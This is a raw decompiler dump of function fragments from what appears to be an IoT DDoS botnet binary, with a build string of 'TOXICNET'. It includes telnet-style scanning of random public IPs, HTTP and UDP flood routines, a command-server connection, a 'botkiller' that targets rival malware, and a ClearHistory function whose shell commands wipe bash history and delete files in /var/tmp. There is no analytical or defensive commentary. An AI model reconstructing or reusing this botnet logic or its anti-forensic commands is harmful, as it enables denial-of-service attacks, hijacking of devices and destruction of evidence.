                                                if (inet_pton(10, (char *)v256, v216) > 0) {
                                                        __GI_fclose((int16_t *)a1);
                                __GI_fclose((int16_t *)a1);
                __GI_fclose((int16_t *)a1);
            __GI_fclose((int16_t *)a1);
                            v223 = __open_etc_hosts();
                                while (true) {
                                    if (fgets(v217, v219, a1) != 0) {
                                        __GI_fclose((int16_t *)a1);
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 36910
++++++++ FUNCTION END 37975
++++++++ FUNCTION LENGTH 1065
        while (true) {
                while (true) {
                    while (true) {
                                        while (true) {
                                            while (true) {
                                                while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                while (true) {
                                                            while (true) {
                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                while (true) {
                                                    while (true) {
                                                                    while (true) {
                                                            while (true) {
    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 23316
++++++++ FUNCTION END 23676
++++++++ FUNCTION LENGTH 360
    int32_t v215 = socket(2, 2, 0); // 0x1000b608
    inet_addr((int32_t)"8.8.8.8");
    if (__libc_connect(v215, (int32_t)&v216, 16) == -1) {
    int32_t v220 = __GI_getsockname(v215, (int32_t)&v219, v218, v218); // 0x1000b6d4
        int32_t v221 = __libc_open((int32_t)"/proc/net/route", 0); // 0x1000b718
        while (true) {
            if (fdgets(v223, 0x1000, v221) != 0) {
                if (strstr(v223, "\t00000000\t", 0x10010000) != 0) {
                        __libc_close(v221);
                            __libc_close(v215);
                        __libc_close(v215);
                    __libc_close(v221);
                        __libc_close(v215);
                    __libc_close(v215);
            __libc_close(v221);
                __libc_close(v215);
            __libc_close(v215);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 57753
++++++++ FUNCTION END 58274
++++++++ FUNCTION LENGTH 521
                if (__GI_sigprocmask(0, (int32_t)&v222, v227) == 0) {
                            __GI_sigprocmask(2, v227, 0);
                            __GI_sigprocmask(2, v227, 0);
                            __GI_sigprocmask(2, v227, 0);
                        __GI_sigprocmask(2, v227, 0);
                        __GI_sigprocmask(2, v227, 0);
                        __GI_sigprocmask(2, v227, 0);
            if (__GI_sigprocmask(0, (int32_t)&v222, v227) == 0) {
                        __GI_sigprocmask(2, v227, 0);
                        __GI_sigprocmask(2, v227, 0);
                        __GI_sigprocmask(2, v227, 0);
                    __GI_sigprocmask(2, v227, 0);
                    __GI_sigprocmask(2, v227, 0);
                    __GI_sigprocmask(2, v227, 0);
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 32573
++++++++ FUNCTION END 33373
++++++++ FUNCTION LENGTH 800
            if (__libc_open(a1, v222) < 0) {
                    free();
                free();
                        free();
            if (__libc_open(a1, v222) < 0) {
                    free();
                            free();
                free();
                free();
        if (__libc_open(a1, v222) < 0) {
                free();
                        free();
            free();
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 72746
++++++++ FUNCTION END 73186
++++++++ FUNCTION LENGTH 440
    int32_t v213 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v212); // 0x10013024
        int32_t v217 = __GI_fopen((int32_t)"/etc/config/resolv.conf", v216); // 0x1001303c
    while (true) {
        if (fgets(v219, 128, v215) == 0) {
            __GI_fclose((int16_t *)v214);
            while (true) {
                                while (true) {
                                        while (true) {
                                            while (true) {
                                                while (true) {
                                                free();
                                                    free();
                                                while (true) {
=================FUNCTION : _init ===================
++++++++ FUNCTION START 316
++++++++ FUNCTION END 680
++++++++ FUNCTION LENGTH 364
        "etrbhhgetrb",
        "wget",
        "botnet",
        "swatnet",
        "fucknet",
        "cracknet",
        "weednet",
        "gaynet",
        "queernet",
        "ballnet",
        "unet",
        "/dev/netslink/",
=================FUNCTION : print ===================
++++++++ FUNCTION START 3784
++++++++ FUNCTION END 4339
++++++++ FUNCTION LENGTH 555
    while (true) {
                    printchar(a1, (int32_t)*v220);
                        while (true) {
                            while (true) {
                                result2 = prints(v216, v240, v229, v225) + result;
                                    int32_t v243 = printi(v216, v242, 10, 1, v229, v225, 97) + result; // 0x10000cb0
                                        int32_t v245 = printi(v216, v244, 16, 0, v229, v225, 97) + result; // 0x10000d64
                                            int32_t v247 = printi(v216, v246, 16, 0, v229, v225, 65) + result; // 0x10000e18
                                                int32_t v249 = printi(v216, v248, 10, 0, v229, v225, 97) + result; // 0x10000ecc
                                                    int32_t v251 = prints(v216, (char *)&v219, v229, v225); // 0x10000f7c
            printchar(a1, (int32_t)*v220);
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 14638
++++++++ FUNCTION END 15053
++++++++ FUNCTION LENGTH 415
    srand(v214 ^ rand_cmwc());
        while (true) {
        while (true) {
                    GetRandomPublicIP(v229);
                                socket(2, 1, 0);
                                    if (__libc_connect(*v228, (int32_t)&v215, 16) == -1) {
                socket(2, 1, 0);
        while (true) {
        while (true) {
    while (true) {
    while (true) {
=================FUNCTION : __heap_free ===================
++++++++ FUNCTION START 53502
++++++++ FUNCTION END 53850
++++++++ FUNCTION LENGTH 348
            __heap_link_free_area((int32_t *)v215, result, v216, result3);
            __heap_link_free_area((int32_t *)v215, result, v216, result3);
                    __heap_link_free_area_after(a1, v220, v225, v218);
                    __heap_link_free_area_after(a1, result2, v219, v218);
            __heap_link_free_area(a1, v224, v219, result2);
    while (true) {
                        __heap_link_free_area_after(a1, v220, v225, v218);
                        __heap_link_free_area_after(a1, result2, v219, v218);
                __heap_link_free_area(a1, v224, v219, result2);
    __heap_link_free_area((int32_t *)v215, result, v216, result3);
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 7047
++++++++ FUNCTION END 7331
++++++++ FUNCTION LENGTH 284
    int32_t v215 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001b6c
    while (true) {
        if (fdgets(v217, 0x1000, v215) == 0) {
            __libc_close(v215);
        uppercase((char *)&v216);
        if (strstr(v217, "BOGOMIPS", 0x10010000) == v217) {
            while (true) {
                            while (true) {
                                        __libc_close(v215);
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 59641
++++++++ FUNCTION END 60035
++++++++ FUNCTION LENGTH 394
            v229 = getuid(0x10030000);
            v227 = geteuid();
                v230 = getgid(v227);
                if (v230 == getegid()) {
    while (true) {
        v229 = getuid(0x10030000);
        v227 = geteuid();
            v230 = getgid(v227);
            if (v230 == getegid()) {
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 79200
++++++++ FUNCTION END 79793
++++++++ FUNCTION LENGTH 593
        return inet_ntop4(a2, a3, a4);
        while (true) {
            while (true) {
                                        if (inet_ntop4(a2 + 12, v255, v256 - v255 + 86) == 0) {
                                v253 = sprintf(v255, (int32_t)"%x", v252, v216, v248, v249, v216, (int32_t)&v254);
                            if (inet_ntop4(a2 + 12, v255, v256 - v255 + 86) == 0) {
                v253 = sprintf(v250, (int32_t)"%x", v252, v216, v248, v249, v216, (int32_t)&v254);
                while (true) {
        while (true) {
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 78305
++++++++ FUNCTION END 78926
++++++++ FUNCTION LENGTH 621
        inet_pton4(v215, a3);
                                while (true) {
                                while (true) {
            while (true) {
                while (true) {
                            if (inet_pton4(v222, v220) > 0) {
                                        while (true) {
                                                        while (true) {
                                                        while (true) {
=================FUNCTION : printi ===================
++++++++ FUNCTION START 3453
++++++++ FUNCTION END 3781
++++++++ FUNCTION LENGTH 328
        result2 = prints(a1, (char *)&v215, a5, a6);
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v219, a5 - 1, a6);
            result = prints(a1, v220, a5, a6);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v219, a5 - 1, a6);
        result2 = prints(a1, v220, a5, a6);
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 16677
++++++++ FUNCTION END 16960
++++++++ FUNCTION LENGTH 283
    random();
    int32_t v216 = random() % 7; // 0x10009ec0
    int32_t result = sprintf(v218, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4, v219, v220, 0x10010000, v216); // 0x10009fe4
    while (true) {
        if (__libc_fork() != 0) {
                while (true) {
                    int32_t v223 = socket_connect(a1, a3); // 0x10009f4c
                        __libc_close(v224);
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 17249
++++++++ FUNCTION END 17491
++++++++ FUNCTION LENGTH 242
    inet_addr(a1);
    int32_t v217 = socket(2, 1, 0); // 0x1000a244
    __libc_connect(v217, (int32_t)&v216, 16);
    __libc_close(v217);
        v217 = socket(2, 1, 0);
        __libc_connect(v217, (int32_t)&v216, 16);
        __libc_close(v217);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 10757
++++++++ FUNCTION END 11026
++++++++ FUNCTION LENGTH 269
        __libc_send(a1, v218, 1, 0x4000);
                __libc_send(a1, v218, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v218, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v218, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 15056
++++++++ FUNCTION END 15309
++++++++ FUNCTION LENGTH 253
    int32_t v215 = socket(2, 2, 0); // 0x10008de8
    int32_t v217 = __GI_gethostbyname(a1); // 0x10008e0c
    while (true) {
        random();
            __libc_send(v215, v226, 65, 0);
            __libc_connect(v215, v219, 16);
                __libc_close(v215);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 7808
++++++++ FUNCTION END 8160
++++++++ FUNCTION LENGTH 352
            while (true) {
                sockprintf(v225, (int32_t)"PING", 0x10010000);
                while (true) {
                        while (true) {
                            if (__libc_recv(v225, (int32_t)&v231, 1, 0) != 1) {
                        while (true) {
    while (true) {
=================FUNCTION : sendHTTP2 ===================
++++++++ FUNCTION START 16963
++++++++ FUNCTION END 17246
++++++++ FUNCTION LENGTH 283
    while (true) {
        int32_t v219 = random() % 36; // 0x1000a0a0
        sprintf(v217, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v220, 0x10010000, v219);
        if (__libc_fork() != 0) {
                while (true) {
                    int32_t v222 = socket_connect(a2, a3); // 0x1000a11c
                        __libc_close(v222);
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 5540
++++++++ FUNCTION END 5808
++++++++ FUNCTION LENGTH 268
    __libc_close(a1);
    __GI_sigprocmask(0, v217, v219);
    while (true) {
        if (__libc_waitpid(v221, (int32_t)&v220, 0) == -1) {
        __GI_sigprocmask(2, v219, 0);
    __GI_sigprocmask(2, v219, 0);
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 7334
++++++++ FUNCTION END 7574
++++++++ FUNCTION LENGTH 240
    int32_t v215 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001d88
    while (true) {
        if (fdgets(v217, 0x1000, v215) == 0) {
            __libc_close(v215);
        uppercase((char *)&v216);
        if (strstr(v217, "BOGOMIPS", 0x10010000) == v217) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 11318
++++++++ FUNCTION END 11646
++++++++ FUNCTION LENGTH 328
        while (true) {
            while (true) {
                    int32_t v223 = __libc_recv(a1, v222, 1, 0); // 0x10003038
                                if (strstr(a6, (char *)a2, v222) != 0) {
                            int32_t v227 = __libc_recv(a1, v222 + 1, 2, 0); // 0x100030a8
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 42935
++++++++ FUNCTION END 43287
++++++++ FUNCTION LENGTH 352
    while (true) {
    while (true) {
                while (true) {
    while (true) {
    while (true) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 55483
++++++++ FUNCTION END 55788
++++++++ FUNCTION LENGTH 305
                while (true) {
                        __GI_random_r((int32_t *)v217, (int32_t)&v218);
                            __GI_random_r((int32_t *)v217, (int32_t)&v218);
            __GI_random_r((int32_t *)v217, (int32_t)&v218);
                __GI_random_r((int32_t *)v217, (int32_t)&v218);
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 38976
++++++++ FUNCTION END 39316
++++++++ FUNCTION LENGTH 340
            while (true) {
        _stdio_openlist_dec_use();
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 70047
++++++++ FUNCTION END 70387
++++++++ FUNCTION LENGTH 340
        while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 14383
++++++++ FUNCTION END 14635
++++++++ FUNCTION LENGTH 252
    if (__GI_gethostbyname(a1) == 0) {
    int32_t v221 = socket(2, 1, 6); // 0x10007cec
    __GI_setsockopt(v221, 6, 1, (int32_t)&v215, 4);
    if (__libc_connect(v221, v217, 16) == -1) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 34843
++++++++ FUNCTION END 35772
++++++++ FUNCTION LENGTH 929
    while (true) {
        while (true) {
                            while (true) {
                                            while (true) {
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 10220
++++++++ FUNCTION END 10504
++++++++ FUNCTION LENGTH 284
    if (getHost(a2, &v217, v216) != 0) {
    if (__libc_connect(a1, v216, 16) > -1) {
        while (true) {
                getsockopt(a1, 1, 4, (int32_t)&v227, (int32_t)&v226);
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 26896
++++++++ FUNCTION END 27282
++++++++ FUNCTION LENGTH 386
            __GI_getpagesize();
                        free();
                free();
            free();
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 10507
++++++++ FUNCTION END 10754
++++++++ FUNCTION LENGTH 247
    int32_t result = __libc_fork(); // 0x100029e4
    while (true) {
                free();
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 52203
++++++++ FUNCTION END 52487
++++++++ FUNCTION LENGTH 284
        free();
            __heap_free(&v219, v217 + v215, v220 - v217);
        free();
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 56743
++++++++ FUNCTION END 57232
++++++++ FUNCTION LENGTH 489
    while (true) {
                        while (true) {
                while (true) {
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 77218
++++++++ FUNCTION END 77528
++++++++ FUNCTION LENGTH 310
        while (true) {
                while (true) {
    while (true) {
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 31630
++++++++ FUNCTION END 31894
++++++++ FUNCTION LENGTH 264
    if (__libc_close(v216) <= 0xffffffff) {
        free();
    _stdio_openlist_dec_use();
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 42284
++++++++ FUNCTION END 42609
++++++++ FUNCTION LENGTH 325
        while (true) {
        while (true) {
        while (true) {
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 42612
++++++++ FUNCTION END 42932
++++++++ FUNCTION LENGTH 320
            while (true) {
    while (true) {
    while (true) {
=================FUNCTION : sockprintf ===================
++++++++ FUNCTION START 4782
++++++++ FUNCTION END 5006
++++++++ FUNCTION LENGTH 224
    print(&v216, a2, (int32_t)&v217);
    int32_t result = __libc_send(a1, v215, __GI_strlen(), 0x4000); // 0x10001270
    free();
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 16215
++++++++ FUNCTION END 16452
++++++++ FUNCTION LENGTH 237
    while (true) {
            __libc_system(v215);
            __libc_system(v215);
=================FUNCTION : ClearHistory ===================
++++++++ FUNCTION START 16455
++++++++ FUNCTION END 16674
++++++++ FUNCTION LENGTH 219
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 23059
++++++++ FUNCTION END 23313
++++++++ FUNCTION LENGTH 254
        __libc_close(v216);
    int32_t v223 = socket(2, 1, 0); // 0x1000b578
    return connectTimeout(v223, v214, v221, 30, v214) == 0;
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 71198
++++++++ FUNCTION END 71452
++++++++ FUNCTION LENGTH 254
    while (true) {
        while (true) {
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 56041
++++++++ FUNCTION END 56300
++++++++ FUNCTION LENGTH 259
    int32_t v218 = __vfork(); // 0x10010914
        if (wait4(v218) == -1) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 64875
++++++++ FUNCTION END 65209
++++++++ FUNCTION LENGTH 334
        while (true) {
    while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 71455
++++++++ FUNCTION END 71760
++++++++ FUNCTION LENGTH 305
    while (true) {
        while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 33820
++++++++ FUNCTION END 34088
++++++++ FUNCTION LENGTH 268
        while (true) {
    while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 55791
++++++++ FUNCTION END 56038
++++++++ FUNCTION LENGTH 247
        srandom_r();
    srandom_r();
=================FUNCTION : trim ===================
++++++++ FUNCTION START 2285
++++++++ FUNCTION END 2564
++++++++ FUNCTION LENGTH 279
    while (true) {
            while (true) {
=================FUNCTION : execl ===================
++++++++ FUNCTION START 57464
++++++++ FUNCTION END 57750
++++++++ FUNCTION LENGTH 286
    while (true) {
    while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 8611
++++++++ FUNCTION END 8851
++++++++ FUNCTION LENGTH 240
    while (true) {
            return __libc_recv(a1, a3, a4, 0);
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 38692
++++++++ FUNCTION END 38973
++++++++ FUNCTION LENGTH 281
            while (true) {
                        free();
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 80978
++++++++ FUNCTION END 81204
++++++++ FUNCTION LENGTH 226
    int32_t v215 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v214); // 0x1001466c
        result = __GI_fopen((int32_t)"/etc/config/hosts", v216);
=================FUNCTION : __GI_strlen ===================
++++++++ FUNCTION START 41980
++++++++ FUNCTION END 42281
++++++++ FUNCTION LENGTH 301
        while (true) {
    while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 9967
++++++++ FUNCTION END 10217
++++++++ FUNCTION LENGTH 250
        while (true) {
            if (strcasestr((char *)a1, v218, 4 * v217 + a2) == 0) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 11029
++++++++ FUNCTION END 11315
++++++++ FUNCTION LENGTH 286
    while (true) {
        while (true) {
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 41176
++++++++ FUNCTION END 41502
++++++++ FUNCTION LENGTH 326
        while (true) {
    while (true) {
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 39319
++++++++ FUNCTION END 39636
++++++++ FUNCTION LENGTH 317
            while (true) {
                char v222 = getc_unlocked((int16_t *)a3, v218); // 0x1000e988
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 63368
++++++++ FUNCTION END 63682
++++++++ FUNCTION LENGTH 314
    while (true) {
            while (true) {
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 70611
++++++++ FUNCTION END 70951
++++++++ FUNCTION LENGTH 340
        while (true) {
        while (true) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 73648
++++++++ FUNCTION END 73983
++++++++ FUNCTION LENGTH 335
            __GI_sigprocmask(1, v215, 0);
        __GI_sigprocmask(1, v215, 0);
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 27285
++++++++ FUNCTION END 27509
++++++++ FUNCTION LENGTH 224
    if (getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 36272
++++++++ FUNCTION END 36677
++++++++ FUNCTION LENGTH 405
            while (true) {
=================FUNCTION : __heap_alloc ===================
++++++++ FUNCTION START 52490
++++++++ FUNCTION END 52772
++++++++ FUNCTION LENGTH 282
    while (true) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 44043
++++++++ FUNCTION END 44300
++++++++ FUNCTION LENGTH 257
    while (true) {
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 81885
++++++++ FUNCTION END 82102
++++++++ FUNCTION LENGTH 217
    return kill(__libc_getpid(), a1);
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 8163
++++++++ FUNCTION END 8380
++++++++ FUNCTION LENGTH 217
    return __GI_inet_ntoa(&v215, a1);
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 6587
++++++++ FUNCTION END 6805
++++++++ FUNCTION LENGTH 218
    int32_t v215 = inet_addr(a1); // 0x10001a70
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 49781
++++++++ FUNCTION END 49997
++++++++ FUNCTION LENGTH 216
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : rand ===================
++++++++ FUNCTION START 53853
++++++++ FUNCTION END 54070
++++++++ FUNCTION LENGTH 217
    return random();
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 43512
++++++++ FUNCTION END 43820
++++++++ FUNCTION LENGTH 308
        while (true) {
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 46704
++++++++ FUNCTION END 46921
++++++++ FUNCTION LENGTH 217
    return __GI_inet_ntoa_r(&v214, (int32_t)&v215);
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 13934
++++++++ FUNCTION END 14153
++++++++ FUNCTION LENGTH 219
    return rand_cmwc();
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 78016
++++++++ FUNCTION END 78302
++++++++ FUNCTION LENGTH 286
    while (true) {
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 49562
++++++++ FUNCTION END 49778
++++++++ FUNCTION LENGTH 216
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 38222
++++++++ FUNCTION END 38454
++++++++ FUNCTION LENGTH 232
    int32_t result = __GI_fgets_unlocked((char *)v215, a2, a3); // 0x1000e59c
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 34324
++++++++ FUNCTION END 34567
++++++++ FUNCTION LENGTH 243
    while (true) {
=================FUNCTION : __heap_alloc_at ===================
++++++++ FUNCTION START 52775
++++++++ FUNCTION END 53045
++++++++ FUNCTION LENGTH 270
    while (true) {
=================FUNCTION : ioctl ===================
++++++++ FUNCTION START 24755
++++++++ FUNCTION END 25047
++++++++ FUNCTION LENGTH 292
            return __GI_tcgetattr((int32_t *)a3);
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 82866
++++++++ FUNCTION END 83181
++++++++ FUNCTION LENGTH 315
    while (true) {
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 41505
++++++++ FUNCTION END 41744
++++++++ FUNCTION LENGTH 239
    while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 7577
++++++++ FUNCTION END 7805
++++++++ FUNCTION LENGTH 228
            v215 = rand_cmwc();
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 6056
++++++++ FUNCTION END 6300
++++++++ FUNCTION LENGTH 244
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 82565
++++++++ FUNCTION END 82863
++++++++ FUNCTION LENGTH 298
    while (true) {
=================FUNCTION : memcpy ===================
++++++++ FUNCTION START 40147
++++++++ FUNCTION END 40555
++++++++ FUNCTION LENGTH 408
        while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 44773
++++++++ FUNCTION END 44991
++++++++ FUNCTION LENGTH 218
    __GI_tcgetattr(&v215);
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 13709
++++++++ FUNCTION END 13931
++++++++ FUNCTION LENGTH 222
    free();
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 4562
++++++++ FUNCTION END 4779
++++++++ FUNCTION LENGTH 217
    return print(&a1, a2, (int32_t)&v215);
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 73189
++++++++ FUNCTION END 73408
++++++++ FUNCTION LENGTH 219
    int32_t result = __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, (int32_t)&v215, a7); // 0x100132e0
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 49124
++++++++ FUNCTION END 49340
++++++++ FUNCTION LENGTH 216
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 32117
++++++++ FUNCTION END 32336
++++++++ FUNCTION LENGTH 219
    return __GI_vsnprintf();
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 83184
++++++++ FUNCTION END 83428
++++++++ FUNCTION LENGTH 244
    while (true) {
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 46924
++++++++ FUNCTION END 47148
++++++++ FUNCTION LENGTH 224
    if (inet_aton((char *)&result) != 0) {
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 63043
++++++++ FUNCTION END 63365
++++++++ FUNCTION LENGTH 322
            while (true) {
=================FUNCTION : random ===================
++++++++ FUNCTION START 54073
++++++++ FUNCTION END 54295
++++++++ FUNCTION LENGTH 222
    __GI_random_r((int32_t *)0x100286a0, (int32_t)&result);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 48905
++++++++ FUNCTION END 49121
++++++++ FUNCTION LENGTH 216
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 4342
++++++++ FUNCTION END 4559
++++++++ FUNCTION LENGTH 217
    return print(NULL, a1, (int32_t)&v215);
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 44303
++++++++ FUNCTION END 44550
++++++++ FUNCTION LENGTH 247
    while (true) {
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 28661
++++++++ FUNCTION END 28878
++++++++ FUNCTION LENGTH 217
    return __libc_open(577, 577);
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 13117
++++++++ FUNCTION END 13335
++++++++ FUNCTION LENGTH 218
    return rand_cmwc() & -1 - a1 ^ v215 & a1;
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 59174
++++++++ FUNCTION END 59405
++++++++ FUNCTION LENGTH 231
    int32_t v215 = __libc_open((int32_t)"/dev/null", a2); // 0x10011094
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 14156
++++++++ FUNCTION END 14380
++++++++ FUNCTION LENGTH 224
        __libc_close(a1);
=================FUNCTION : srand ===================
++++++++ FUNCTION START 54753
++++++++ FUNCTION END 54973
++++++++ FUNCTION LENGTH 220
    srandom_r();
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 48467
++++++++ FUNCTION END 48683
++++++++ FUNCTION LENGTH 216
    return __socketcall(3, (int32_t)&a1);
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 51626
++++++++ FUNCTION END 51926
++++++++ FUNCTION LENGTH 300
            __heap_free((int32_t *)v223, v221, v224);
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 47151
++++++++ FUNCTION END 47370
++++++++ FUNCTION LENGTH 219
    gethostbyname_r(a1, &v215, (int32_t)&v214, 460, (int32_t)&result, v213);
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 77531
++++++++ FUNCTION END 77783
++++++++ FUNCTION LENGTH 252
    while (true) {
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 46462
++++++++ FUNCTION END 46701
++++++++ FUNCTION LENGTH 239
    while (true) {
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 49343
++++++++ FUNCTION END 49559
++++++++ FUNCTION LENGTH 216
    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 30516
++++++++ FUNCTION END 30733
++++++++ FUNCTION LENGTH 217
    return wait4(0);
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 32339
++++++++ FUNCTION END 32570
++++++++ FUNCTION LENGTH 231
    int32_t result = _vfprintf_internal(); // 0x1000cfe4
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 35775
++++++++ FUNCTION END 36039
++++++++ FUNCTION LENGTH 264
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 5811
++++++++ FUNCTION END 6053
++++++++ FUNCTION LENGTH 242
    while (true) {
=================FUNCTION : __GI__exit ===================
++++++++ FUNCTION START 25746
++++++++ FUNCTION END 25973
++++++++ FUNCTION LENGTH 227
    while (true) {
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 8854
++++++++ FUNCTION END 9078
++++++++ FUNCTION LENGTH 224
        __libc_close(*a1);
=================FUNCTION : getBuild ===================
++++++++ FUNCTION START 23679
++++++++ FUNCTION END 23896
++++++++ FUNCTION LENGTH 217
    return (int32_t)"TOXICNET";
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 78929
++++++++ FUNCTION END 79197
++++++++ FUNCTION LENGTH 268
    while (true) {
=================FUNCTION : free ===================
++++++++ FUNCTION START 51929
++++++++ FUNCTION END 52200
++++++++ FUNCTION LENGTH 271
    int32_t v216 = __heap_free(&v214, v213 - 4, v215); // 0x1000feec
=================FUNCTION : socket ===================
++++++++ FUNCTION START 50000
++++++++ FUNCTION END 50216
++++++++ FUNCTION LENGTH 216
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 31897
++++++++ FUNCTION END 32114
